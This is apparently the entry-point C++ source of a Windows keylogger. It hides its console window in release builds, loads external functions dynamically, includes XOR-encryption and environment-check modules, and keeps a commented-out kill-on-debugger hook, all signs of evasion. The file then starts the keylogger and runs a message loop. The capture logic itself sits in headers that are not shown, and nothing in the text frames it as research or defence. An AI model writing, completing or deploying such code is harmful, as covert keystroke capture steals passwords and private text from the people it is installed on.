#include <cstdio>
#include "KeyLog.h"
#include <Windows.h>
#include "XorEnc.h"
#include "EnvironmentCheck.h"
#include "ExternFnLoader.h"
// console host
#ifdef _DEBUG
int main()
#else
// no console host
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
#endif 
{
    //KILLSELF_ON_DEBUGGER;

    ExternFnLdr efldr;
    if (!efldr.load())
        return -1;

    KeyLog kl;
    if (!kl.init())
        return -1;


    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

}